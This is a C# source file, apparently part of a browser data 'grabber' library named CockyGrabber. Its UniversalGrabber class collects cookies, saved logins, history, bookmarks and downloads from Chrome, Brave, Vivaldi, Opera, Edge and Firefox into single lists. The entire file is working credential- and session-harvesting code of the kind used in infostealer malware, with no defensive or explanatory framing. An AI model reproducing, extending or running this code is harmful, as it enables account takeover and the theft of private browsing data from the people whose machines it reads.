using System.Collections.Generic;

namespace CockyGrabber.Grabbers
{
    public class UniversalGrabber
    {
        private readonly BlinkGrabber[] BlinkGrabbers =
        {
            new ChromeGrabber(),
            new BraveGrabber(),
            new VivaldiGrabber(),
            new OperaGrabber(),
            new OperaGxGrabber(),
            new EdgeGrabber(),
        };
        private readonly GeckoGrabber[] GeckoGrabbers =
        {
            new FirefoxGrabber(),
        };

        #region GetCookies()
        public IEnumerable<Blink.Cookie> GetAllBlinkCookiesBy(Blink.Cookie.Header by, object value)
        {
            List<Blink.Cookie> cookies = new List<Blink.Cookie>();

            foreach (BlinkGrabber g in BlinkGrabbers)
            {
                // Add Cookies to list:
                if (g.CookiesExist())
                    cookies.AddRange(g.GetCookiesBy(by, value));
            }

            return cookies;
        }
        public IEnumerable<Blink.Cookie> GetAllBlinkCookies()
        {
            List<Blink.Cookie> cookies = new List<Blink.Cookie>();

            foreach (BlinkGrabber g in BlinkGrabbers)
            {
                // Add Cookies to list:
                if (g.CookiesExist())
                    cookies.AddRange(g.GetCookies());
            }

            return cookies;
        }

        public IEnumerable<Gecko.Cookie> GetAllGeckoCookiesBy(Gecko.Cookie.Header by, object value)
        {
            List<Gecko.Cookie> cookies = new List<Gecko.Cookie>();

            foreach (GeckoGrabber g in GeckoGrabbers)
            {
                // Add Cookies to list:
                cookies.AddRange(g.GetCookiesBy(by, value));
            }

            return cookies;
        }
        public IEnumerable<Gecko.Cookie> GetAllGeckoCookies()
        {
            List<Gecko.Cookie> cookies = new List<Gecko.Cookie>();

            foreach (GeckoGrabber g in GeckoGrabbers)
            {
                // Add Cookies to list:
                cookies.AddRange(g.GetCookies());
            }

            return cookies;
        }
        #endregion

        #region GetLogins()
        public IEnumerable<Blink.Login> GetAllBlinkLoginsBy(Blink.Login.Header by, object value)
        {
            List<Blink.Login> logins = new List<Blink.Login>();

            foreach (BlinkGrabber g in BlinkGrabbers)
            {
                // Add Logins to list:
                if (g.LoginsExist())
                    logins.AddRange(g.GetLoginsBy(by, value));
            }

            return logins;
        }
        public IEnumerable<Blink.Login> GetAllBlinkLogins()
        {
            List<Blink.Login> logins = new List<Blink.Login>();

            foreach (BlinkGrabber g in BlinkGrabbers)
            {
                // Add Logins to list:
                if (g.LoginsExist())
                    logins.AddRange(g.GetLogins());
            }

            return logins;
        }

        public IEnumerable<Gecko.Login> GetAllGeckoLoginsBy(Gecko.Login.Header by, object value)
        {
            List<Gecko.Login> logins = new List<Gecko.Login>();

            foreach (GeckoGrabber g in GeckoGrabbers)
            {
                // Add Logins to list:
                logins.AddRange(g.GetLoginsBy(by, value));
            }

            return logins;
        }
        public IEnumerable<Gecko.Login> GetAllGeckoLogins()
        {
            List<Gecko.Login> logins = new List<Gecko.Login>();

            foreach (GeckoGrabber g in GeckoGrabbers)
            {
                // Add Logins to list:
                logins.AddRange(g.GetLogins());
            }

            return logins;
        }
        #endregion

        #region GetHistory()
        public IEnumerable<Blink.Site> GetAllBlinkHistoriesBy(Blink.Site.Header by, object value)
        {
            List<Blink.Site> sites = new List<Blink.Site>();

            foreach (BlinkGrabber g in BlinkGrabbers)
            {
                // Add Sites to list:
                if (g.HistoryExist())
                    sites.AddRange(g.GetHistoryBy(by, value));
            }

            return sites;
        }
        public IEnumerable<Blink.Site> GetAllBlinkHistories()
        {
            List<Blink.Site> sites = new List<Blink.Site>();

            foreach (BlinkGrabber g in BlinkGrabbers)
            {
                // Add Sites to list:
                if (g.HistoryExist())
                    sites.AddRange(g.GetHistory());
            }

            return sites;
        }

        public IEnumerable<Gecko.Site> GetAllGeckoHistoriesBy(Gecko.Site.Header by, object value)
        {
            List<Gecko.Site> sites = new List<Gecko.Site>();

            foreach (GeckoGrabber g in GeckoGrabbers)
            {
                // Add Sites to list:
                sites.AddRange(g.GetHistoryBy(by, value));
            }

            return sites;
        }
        public IEnumerable<Gecko.Site> GetAllGeckoHistories()
        {
            List<Gecko.Site> sites = new List<Gecko.Site>();

            foreach (GeckoGrabber g in GeckoGrabbers)
            {
                // Add Sites to list:
                sites.AddRange(g.GetHistory());
            }

            return sites;
        }
        #endregion

        #region GetBookmarks()
        public IEnumerable<Blink.Bookmark> GetAllBlinkBookmarksBy(Blink.Bookmark.Header by, object value)
        {
            List<Blink.Bookmark> bookmarks = new List<Blink.Bookmark>();

            foreach (BlinkGrabber g in BlinkGrabbers)
            {
                // Add Bookmarks to list:
                if (g.BookmarksExist())
                    bookmarks.AddRange(g.GetBookmarksBy(by, value));
            }

            return bookmarks;
        }
        public IEnumerable<Blink.Bookmark> GetAllBlinkBookmarks()
        {
            List<Blink.Bookmark> bookmarks = new List<Blink.Bookmark>();

            foreach (BlinkGrabber g in BlinkGrabbers)
            {
                // Add Bookmarks to list:
                if (g.BookmarksExist())
                    bookmarks.AddRange(g.GetBookmarks());
            }

            return bookmarks;
        }

        public IEnumerable<Gecko.Bookmark> GetAllGeckoBookmarksBy(Gecko.Bookmark.Header by, object value)
        {
            List<Gecko.Bookmark> bookmarks = new List<Gecko.Bookmark>();

            foreach (GeckoGrabber g in GeckoGrabbers)
            {
                // Add Bookmarks to list:
                bookmarks.AddRange(g.GetBookmarksBy(by, value));
            }

            return bookmarks;
        }
        public IEnumerable<Gecko.Bookmark> GetAllGeckoBookmarks()
        {
            List<Gecko.Bookmark> bookmarks = new List<Gecko.Bookmark>();

            foreach (GeckoGrabber g in GeckoGrabbers)
            {
                // Add Bookmarks to list:
                bookmarks.AddRange(g.GetBookmarks());
            }

            return bookmarks;
        }
        #endregion

        #region GetDownloads()
        public IEnumerable<Blink.Download> GetAllBlinkDownloadsBy(Blink.Download.Header by, object value)
        {
            List<Blink.Download> downloads = new List<Blink.Download>();

            foreach (BlinkGrabber g in BlinkGrabbers)
            {
                // Add Downloads to list:
                if (g.HistoryExist())
                    downloads.AddRange(g.GetDownloadsBy(by, value));
            }

            return downloads;
        }
        public IEnumerable<Blink.Download> GetAllBlinkDownloads()
        {
            List<Blink.Download> downloads = new List<Blink.Download>();

            foreach (BlinkGrabber g in BlinkGrabbers)
            {
                // Add Downloads to list:
                if (g.HistoryExist())
                    downloads.AddRange(g.GetDownloads());
            }

            return downloads;
        }

        public IEnumerable<Gecko.Download> GetAllGeckoDownloadsBy(Gecko.Download.Header by, object value)
        {
            List<Gecko.Download> downloads = new List<Gecko.Download>();

            foreach (GeckoGrabber g in GeckoGrabbers)
            {
                // Add Downloads to list:
                downloads.AddRange(g.GetDownloadsBy(by, value));
            }

            return downloads;
        }
        public IEnumerable<Gecko.Download> GetAllGeckoDownloads()
        {
            List<Gecko.Download> downloads = new List<Gecko.Download>();

            foreach (GeckoGrabber g in GeckoGrabbers)
            {
                // Add Downloads to list:
                downloads.AddRange(g.GetDownloads());
            }

            return downloads;
        }
        #endregion
    }
}